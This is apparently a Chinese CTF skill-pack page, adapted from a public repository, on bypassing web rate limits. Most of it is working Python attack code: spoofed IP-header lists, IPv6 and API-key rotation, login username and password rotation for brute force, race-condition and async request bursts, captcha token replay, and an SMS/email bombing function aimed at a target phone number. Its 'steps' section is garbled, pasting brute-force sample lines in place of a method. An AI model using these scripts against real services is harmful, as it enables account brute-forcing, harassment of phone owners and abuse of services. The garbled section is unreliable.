# 速率限制绕过 — IP 轮换、Header 操纵与应用层绕过

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/16-rate-limit/01-rate-limit-bypass.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **授权范围**：仅限 CTF 靶场 / AWD 赛场 / 已签署授权的测试环境。任何真实第三方目标、真实凭据、真实支付/生产流量都禁止套用本文流程。
> **什么时候用**：命中「rate limit bypass / 速率限制绕过 / X-Forwarded-For / IP轮换」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- rate limit bypass
- 速率限制绕过
- X-Forwarded-For
- IP轮换
- IPv6旋转
- 并发绕过
- 验证码绕过
- CDN bypass

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：

| 工具 | 本机状态 | 本机命令 / 替代方案 |
|---|---|---|
| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |

- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。


## 步骤

1. **核心方法论** — 请求 1: username=admin, password=pass1 → 错误, count=1
2. **核心方法论** — 请求 2: username=admin, password=pass2 → 错误, count=2
3. **核心方法论** — 请求 N: username=admin, password=password → 正确!

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **输入信号** — 登录/注册/API 端点返回 `429 Too Many Requests` 或 `X-RateLimit-Remaining: 0`
- **输入信号** — 响应头中包含限流信息（`X-RateLimit-*`、`Retry-After`、`X-Rate-Limit`）
- **输入信号** — 错误信息提示 "Too many attempts, try again in X seconds"
- **输入信号** — 验证码/滑动验证在 N 次失败后出现
- **输入信号** — 验证码逻辑在客户端执行或可被重放
- **输入信号** — API 文档中描述了 rate limit 策略但未说明 bypass 保护
- **输入信号** — 不同 API 端点限流策略不一致（登录严格，注册宽松，或反之）
- **输入信号** — 使用 CDN/反向代理（Cloudflare、Akamai、Fastly 等）但有旁路 IP 可达
- **Evidence** — 保存 baseline、限流阈值、`Retry-After`、`X-RateLimit-*`、响应长度、响应时间。
- **Evidence** — 对每个绕过维度记录：改变字段、计数器是否重置、业务 oracle 是否成功。
- **Evidence** — 对并发场景记录：并发数、HTTP 成功数、业务成功数、最终状态/副作用。
- **Evidence** — 输出统一放入 `exports/ctf-website/<case>/`，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

## 场景

速率限制（Rate Limiting）是网络应用最常见的反自动化对抗。高水平的绕过不在于消除限制，而在于理解限制的实现层级：IP 粒度、用户粒度、会话粒度、还是全局计数器。每种实现都有不同的绕过路径。本文件覆盖从基础设施层到应用层的完整绕过方法论。

## 输入信号

- 登录/注册/API 端点返回 `429 Too Many Requests` 或 `X-RateLimit-Remaining: 0`
- 响应头中包含限流信息（`X-RateLimit-*`、`Retry-After`、`X-Rate-Limit`）
- 错误信息提示 "Too many attempts, try again in X seconds"
- 验证码/滑动验证在 N 次失败后出现
- 验证码逻辑在客户端执行或可被重放
- API 文档中描述了 rate limit 策略但未说明 bypass 保护
- 不同 API 端点限流策略不一致（登录严格，注册宽松，或反之）
- 使用 CDN/反向代理（Cloudflare、Akamai、Fastly 等）但有旁路 IP 可达

## 核心方法论

### 0. 限流 Key 反推

先反推出限流 key，再谈绕过。每次只改变一个维度，看计数器是否重置。

| 维度 | 单变量变化 | 如果重置，说明 key 包含 |
|---|---|---|
| IP | `X-Forwarded-For` / 源 IP | client IP |
| 用户名 | `admin` → `Admin` / 尾空格 | raw username |
| Session | 换 Cookie | session id |
| Token | 换 Bearer/API key | token/key |
| Endpoint | `/login` → `/api/login` | path/route |
| Method | POST → PUT/GET | method |
| Content-Type | JSON → form | parser/content-type |
| Device | `User-Agent`, device_id | device fingerprint |
| Captcha | captcha token | captcha challenge |

限流响应采样器：

```python
import time
import requests

def rate_limit_profile(url, payload, headers=None, n=12):
    rows = []
    for i in range(n):
        t0 = time.perf_counter()
        r = requests.post(url, json=payload, headers=headers or {}, timeout=8)
        dt = time.perf_counter() - t0
        rows.append({
            "i": i,
            "status": r.status_code,
            "retry_after": r.headers.get("Retry-After"),
            "remaining": r.headers.get("X-RateLimit-Remaining") or r.headers.get("X-Rate-Limit-Remaining"),
            "reset": r.headers.get("X-RateLimit-Reset"),
            "len": len(r.text),
            "time": round(dt, 3),
        })
    return rows
```

成功样本：变更某一维度后 `Remaining` 重置、`429` 消失、业务动作成功。失败样本：状态码 200 但响应为验证码/软拦截；这不是绕过，要看业务 oracle。

### 1. IP 级绕过

#### 1.1 Headers 注入

IP 地址来源的优先级决定哪些 header 可以绕过限流。如果后端从 `X-Forwarded-For` 取 IP，配置错误时任意 header 值都被信任：

```python
# ip_header_bypass.py — IP Header 轮换绕过

import requests

IP_BYPASS_HEADERS = [
    # === 标准代理头 ===
    {"X-Forwarded-For": "{ip}"},
    {"X-Forwarded-For": "{ip}, 10.0.0.1"},        # 链式代理
    {"X-Forwarded-For": "{ip}, 127.0.0.1"},

    # === 非标准代理头 ===
    {"X-Real-IP": "{ip}"},
    {"X-Originating-IP": "{ip}"},
    {"X-Remote-IP": "{ip}"},
    {"X-Remote-Addr": "{ip}"},
    {"X-Client-IP": "{ip}"},
    {"X-Host": "{ip}"},
    {"X-ProxyUser-IP": "{ip}"},

    # === 云服务头 ===
    {"CF-Connecting-IP": "{ip}"},       # Cloudflare
    {"True-Client-IP": "{ip}"},          # Akamai / Cloudflare
    {"X-Akamai-Edge-Ok": "{ip}"},

    # === AWS 负载均衡器头 ===
    {"X-Forwarded-For": "{ip}"},
    {"X-Forwarded-Proto": "https"},

    # === 注入多个值混淆 ===
    {"X-Forwarded-For": "{ip}, 192.168.1.1, 10.0.0.1, 127.0.0.1"},
    {"X-Real-IP": "{ip}", "X-Forwarded-For": "{ip}"},

    # === 公司内网头 (某些系统跳过内网限流) ===
    {"X-Forwarded-For": "10.{ip}"},       # 10.0.0.0/8 内网
    {"X-Forwarded-For": "172.16.{ip}"},   # 172.16.0.0/12
    {"X-Forwarded-For": "192.168.{ip}"},  # 192.168.0.0/16
    {"X-Internal-Request": "true"},
    {"X-Is-Internal": "true"},
]
```

#### 1.2 IPv6 /64 子网轮换

IPv6 /64 子网包含 2^64 个地址。如果限流按 /64 或更粗粒度，则无法通过 IPv6 轮换绕过。但如果按 /128（单个 IP）粒度，每个服务器/容器都能发出大量请求：

```python
# ipv6_rotation.py — IPv6 地址轮换

import socket, struct, random
import concurrent.futures
import requests

class IPv6Rotator:
    """
    IPv6 轮换绕过速率限制
    使用 /64 前缀的后 64 位做随机化
    原理: 单个 IPv6 /64 子网可包含 2^64 个地址
    如果限流按 /128 粒度，每个请求用不同 IP
    """

    def __init__(self, prefix_64: str):
        """
        prefix_64: "2001:db8:1234:5678" (前 64 位)
        """
        self.prefix = prefix_64

    def random_ipv6(self) -> str:
        """生成 /64 子网内的随机 IPv6 地址"""
        # 前 64 位固定
        # 后 64 位随机
        suffix = random.randint(0, 2**64 - 1)
        addr = f"{self.prefix}:{suffix:016x}"
        # 压缩格式 (简化)
        return addr

    def sequential_ipv6(self, index: int) -> str:
        """生成序号 IPv6 地址"""
        return f"{self.prefix}:{index:016x}"

    def request_with_ipv6(self, url: str, method="POST", **kwargs) -> requests.Response:
        """使用特定 IPv6 地址发起请求"""
        # 创建绑定到指定 IP 的 socket
        src_addr = self.random_ipv6()
        # 注意: 实际使用需要本地 IPv6 支持
        # 以下为概念代码，生产环境需配置本地 IPv6 地址
        session = requests.Session()
        # 如果系统支持 IPv6 源地址绑定:
        # session.mount("https://", IPv6Adapter(source_address=src_addr))
        return session.request(method, url, **kwargs)

    @staticmethod
    def find_ipv6_prefix() -> str:
        """探测本机 IPv6 前缀以确定可用的源地址范围"""
        # 获取本机 IPv6 地址
        try:
            # 简单方案: 暴露的 IPv6 地址的前 64 位
            hostname = socket.gethostname()
            addrs = socket.getaddrinfo(hostname, None, socket.AF_INET6)
            for addr in addrs:
                ip = addr[4][0]
                # 提取前 64 位
                parts = ip.split(':')
                prefix = ':'.join(parts[:4])
                return prefix
        except:
            return None
```

#### 1.3 真实 CDN 绕过案例

```python
# cdn_bypass.py — CDN 绕过找到真实源 IP

def find_origin_ip(target_domain: str) -> list:
    """
    绕过 CDN 找到源站 IP
    源站 IP 通常没有限流或限流策略不同
    """
    import dns.resolver
    import shodan  # 可选

    methods = []

    # 1. DNS 历史记录 (SecurityTrails, Censys)
    # 2. 子域名枚举 (不同的子域名可能不经过 CDN)
    # 3. SSL 证书透明度日志
    # 4. 邮件服务器 MX 记录
    # 5. Shodan/Censys 搜索: http.title:"target"
    # 6. 应用自身功能: 图片 URL, 文件上传, API 返回的域名

    # 示例: 通过 MX 记录找真实域名
    try:
        answers = dns.resolver.resolve(target_domain, 'MX')
        for mx in answers:
            mx_str = str(mx.exchange)
            # 解析 MX 的 A 记录
            a_records = dns.resolver.resolve(mx_str, 'A')
            for a in a_records:
                methods.append(("MX_record", str(a)))
    except:
        pass

    # 示例: 通过子域名枚举
    common_subdomains = [
        "direct", "origin", "api", "cdn", "static",
        "mail", "webmail", "admin", "dev", "staging",
        "direct-lb", "origin-lb", "edge-not-enabled",
    ]
    for sub in common_subdomains:
        potential = f"{sub}.{target_domain}"
        try:
            answers = dns.resolver.resolve(potential, 'A')
            for a in answers:
                methods.append(("subdomain", str(a), potential))
        except:
            continue

    return methods
```

### 2. 应用层绕过

#### 2.1 参数轮换

很多限流基于请求参数组合的哈希。简单改变一个参数即可重置计数器：

```python
# param_rotation.py — 参数轮换绕过程序化

def login_with_param_rotation(base_url, username_base, password):
    """
    登录限流绕过: 每次请求改变 username 但指向同一账户
    原理: 后端限流 key = "login:" + MD5(username)
    如果 username 变化(key 变化), 限流重置

    方法:
    1. username + random padding: "admin%00", "admin "
    2. Unicode 等价: "admin" "admìn" (normalized)
    3. username + {" " * i}
    4. email 大小写: "Admin@test.com", "admin@Test.com"
    5. URL 编码不同表示: "admin" vs "%61dmin"
    """
    rotation_methods = [
        lambda u: u,                          # 原始
        lambda u: u + " ",                    # 尾部空格
        lambda u: u.upper(),                  # 全大写
        lambda u: u.capitalize(),             # 首字母大写
        lambda u: u + "\x00",                 # null 字节
        lambda u: u.replace('a', 'а'),   # 西里尔字母 'а' (注意: 视觉相同)
        lambda u: u + f"?t={random.randint(1,9999)}",
    ]

    for i in range(100):
        method = rotation_methods[i % len(rotation_methods)]
        rotated_name = method(username_base)
        # 如果后端 normailize 后相同 → 同用户
        # 如果后端用 raw string 作为 key → 不同用户
        r = requests.post(f"{base_url}/api/login", json={
            "username": rotated_name,
            "password": password,
        })
        print(f"Request {i}: username={repr(rotated_name)[:30]:30s} → {r.status_code}")
        if r.status_code == 200:
            print(f"  [!] Bypass! Response: {r.text[:100]}")
            break
```

#### 2.2 密码 + 后缀攻击

当限流基于 `(username, password)` 元组时，相同用户名+不同密码被视为不同请求：

```python
# password_suffix_bypass.py — 密码后缀绕过

def password_suffix_rate_limit_bypass(base_url, username):
    """
    场景: 限流 key = hash(ip + username)
    但后端先检查密码正确性再更新计数器
    使用 password + suffix 方式: 每次密码不同但最终正确

    原理:
    如果登录限流在密码验证之后计数 (错误的常见实现):
    - 请求 1: username=admin, password=pass1 → 错误, count=1
    - 请求 2: username=admin, password=pass2 → 错误, count=2
    - ...
    - 请求 N: username=admin, password=password → 正确!

    绕过方式: 用 password+1, password+2, ..., 最后 password (正确值)
    如果限流 key 包含 password, 每个 password 都不同, 计数器独立
    """
    correct_password = "password123"  # 正确的密码

    # 方法 1: 插入中间失败的请求
    for i in range(5):
        r = requests.post(f"{base_url}/api/login", json={
            "username": username,
            "password": f"{correct_password}{i}",  # wrong
        })

    # 最后发送正确的
    r = requests.post(f"{base_url}/api/login", json={
        "username": username,
        "password": correct_password,
    })
    return r.status_code
```

#### 2.3 并发竞态绕过

如果限流计数器不是原子的（例如：读取当前计数→检查阈值→递增），并发请求可同时通过：

```python
# rate_limit_race.py — 限流竞态绕过

import concurrent.futures, threading, time, requests

class RateLimitRaceBypass:
    """
    利用竞态条件绕过速率限制
    原理: 如果限流实现是 "读→判断→写" 非原子操作
    N 个并发请求可能同时通过检查
    """

    def __init__(self, base_url, endpoint, payload_template):
        self.base = base_url
        self.endpoint = endpoint
        self.payload_template = payload_template

    def race_bypass(self, n_requests=30, n_workers=15) -> list:
        """并发请求绕过限流"""
        successes = []
        lock = threading.Lock()
        barrier = threading.Barrier(n_workers)

        def worker(worker_id: int):
            s = requests.Session()
            try:
                barrier.wait(timeout=5)  # 同步释放
            except:
                pass
            r = s.post(f"{self.base}{self.endpoint}",
                      json=self.payload_template, timeout=15)
            with lock:
                if r.status_code == 200:
                    successes.append(worker_id)

        with concurrent.futures.ThreadPoolExecutor(max_workers=n_workers) as ex:
            futs = [ex.submit(worker, i) for i in range(n_requests)]
            concurrent.futures.wait(futs)

        return successes
```

#### 2.4 Async I/O 高效绕过

```python
# async_rate_limit_bypass.py — 异步高效绕过

import asyncio, aiohttp, time

class AsyncRateLimitBypass:
    """
    使用 asyncio + aiohttp 高速绕过限流
    单线程异步 I/O 可以最大化连接复用
    """

    def __init__(self, base_url, max_concurrent=100):
        self.base = base_url
        self.max_concurrent = max_concurrent
        self.semaphore = asyncio.Semaphore(max_concurrent)

    async def request(self, session, payload, headers=None) -> dict:
        async with self.semaphore:
            async with session.post(self.base, json=payload,
                                   headers=headers, timeout=aiohttp.ClientTimeout(15)) as r:
                return {
                    "status": r.status,
                    "text": await r.text(),
                    "headers": dict(r.headers),
                }

    async def rotate_headers_burst(self, payloads: list, n_rotations: int):
        """
        异步 IP header 轮换 + 批量请求
        每秒可发送数千个请求
        """
        connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for i in range(n_rotations):
                headers = {"X-Forwarded-For": f"{i}.{i}.{i}.{i}"}
                payload = payloads[i % len(payloads)]
                tasks.append(self.request(session, payload, headers))

            results = await asyncio.gather(*tasks, return_exceptions=True)
            successes = [r for r in results if isinstance(r, dict) and r["status"] == 200]
            return successes
```

### 3. 真实攻击链案例

#### 3.1 短信/邮箱轰炸绕过

```python
# sms_bomb_bypass.py — 短信轰炸绕过

def sms_bomb_bypass(target_phone, base_url):
    """
    短信/邮箱验证码轰炸绕过完整套件
    """
    attack_matrix = [
        # 1. 参数轮换
        {"phone": target_phone, "country_code": "86"},
        {"phone": target_phone, "country_code": "+86"},
        {"phone": target_phone, "area_code": "086"},
        {"phone": target_phone.replace("+86", "")},

        # 2. 不同端点
        ("GET", f"/api/send-code?phone={target_phone}"),
        ("POST", "/api/send_code", {"mobile": target_phone}),
        ("POST", "/api/sendSms", {"phoneNumbers": target_phone}),
        ("POST", "/api/verification/send", {"target": target_phone}),

        # 3. 不同 Content-Type
        # application/json vs form-urlencoded vs multipart

        # 4. 重复使用同一验证码在不同端点
        # /api/send-code → /api/send-code-v2 → /api/resend-code
    ]

    for method, *rest in attack_matrix:
        if method == "POST":
            path, data = rest
            r = requests.post(f"{base_url}{path}", json=data)
        else:
            path = rest[0]
            r = requests.get(f"{base_url}{path}")
        print(f"{method} {path} → {r.status_code}")
```

#### 3.2 API Key 轮换绕过

如果系统使用 API key 做身份验证和限流，多 key 轮转可以绕过：

```python
# api_key_rotation.py — API Key 轮换

def api_key_rotation_bypass(base_url, api_keys: list, endpoint: str):
    """
    多 API key 轮换绕过频率限制
    场景: 每个 key 有 1000 req/h 限制
    如果有 10 个 key → 10000 req/h
    """
    for i in range(10000):
        key = api_keys[i % len(api_keys)]
        r = requests.get(f"{base_url}{endpoint}",
                        headers={"Authorization": f"Bearer {key}"})
        if r.status_code == 200:
            # 处理响应
            pass
        else:
            print(f"Key {key[:16]}... exhausted at request {i}")
```

### 4. 验证码绕过

```python
# captcha_bypass.py — 验证码绕过技术

"""
常见验证码绕过:
1. 复用同一验证码 token (不验证一次有效性)
2. 验证逻辑在客户端 JS (逆向 JS 找到验证函数)
3. 滑动验证码轨迹模拟 (OpenCV + 贝塞尔曲线)
4. OCR 识别 (Tesseract / 深度学习)
5. 验证码结果在响应中返回 (img 的 data-url 包含答案)
6. 修改验证码的返回值 (响应篡改)
7. 切换 API 端点 (一个端点要验证码,另一个不需要)
8. 图形验证码降级为算术验证码 (更易自动化)
"""

def captcha_token_reuse(endpoint_with_captcha: str, session, payload):
    """
    验证码 Token 重放
    如果 token 不标记已使用，可重复使用
    """
    # Step 1: 获取验证码和 token
    r = session.get(f"{endpoint_with_captcha}/captcha")
    captcha_token = r.json().get("token")
    captcha_answer = r.json().get("answer")  # 有时答案直接返回!

    # Step 2: 用同一个 token 多次请求
    for i in range(10):
        payload_with_captcha = {**payload, "captcha_token": captcha_token,
                                 "captcha_answer": captcha_answer}
        r = session.post(endpoint_with_captcha, json=payload_with_captcha)
        print(f"Request {i}: {r.status_code}")

    # Step 3: 如果验证码逻辑在客户端:
    # 逆向 JS 找到 checkCaptcha() 函数
    # 直接调用验证通过的函数
```

## 攻击链

```
Phase 1 — 限流策略发现
  ├── 渐进式请求 (1→2→4→8...) 确定限流阈值
  ├── 观察 429 响应头和 Retry-After 值
  ├── 确认限流粒度: IP / User / Session / 全局
  └── 测试不同端点限流是否独立

Phase 2 — IP 层绕过
  ├── X-Forwarded-For / X-Real-IP 注入测试
  ├── IPv6 /64 子网轮换 (如果有 IPv6 能力)
  ├── CDN 绕过 → 源站 IP 直接访问
  └── 代理列表轮换 (SOCKS5/HTTP proxy pool)

Phase 3 — 应用层绕过
  ├── 参数轮换 (用户名 padding, 密码后缀)
  ├── API key 轮换
  ├── 并发竞态绕过
  ├── 不同 API 端点切换
  └── Content-Type/token 切换

Phase 4 — 验证码绕过
  ├── Token 重放 / 答案泄露
  ├── OCR / 轨迹模拟
  └── 逻辑降级
```

## 软拦截与业务 Oracle

很多系统不用 `429`，而是返回 `200` + 风控页面、验证码、空结果或延迟。必须把 HTTP 成功和业务成功分开。

| 响应 | 判断 |
|---|---|
| `429` + `Retry-After` | 明确限流 |
| `200` + captcha 字段 | 软拦截 |
| `200` + `success:false` | 业务拒绝 |
| `202` | 请求入队，去查任务结果 |
| 延迟稳定增加 | tarpit/排队 |
| `Set-Cookie` 新 device/session | 风控重置身份 |
| `X-RateLimit-Remaining` 缺失但动作失败 | 隐式限流 |

业务 oracle 示例：

```python
def action_success(resp):
    text = resp.text.lower()
    if resp.status_code in (401, 403, 429):
        return False
    if any(x in text for x in ["captcha", "too many", "try again", "risk"]):
        return False
    if any(x in text for x in ["success", "created", "sent", "accepted", "flag{", "ctf{"]):
        return True
    return resp.status_code in (200, 201, 204)
```

## 参考资料

- OWASP: Rate Limiting Vulnerability Cheat Sheet
- PortSwigger Research: "New IP Rotate bypass technique using X-Forwarded-For"
- Cloudflare: "Best practices for rate limiting — what NOT to do"
- SANS: "Bypassing Web Application Rate Limits"
- CVE-2024-23917: TeamCity Rate Limit Bypass via IP Header Injection

## Evidence

- 保存 baseline、限流阈值、`Retry-After`、`X-RateLimit-*`、响应长度、响应时间。
- 对每个绕过维度记录：改变字段、计数器是否重置、业务 oracle 是否成功。
- 对并发场景记录：并发数、HTTP 成功数、业务成功数、最终状态/副作用。
- 输出统一放入 `exports/ctf-website/<case>/`，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
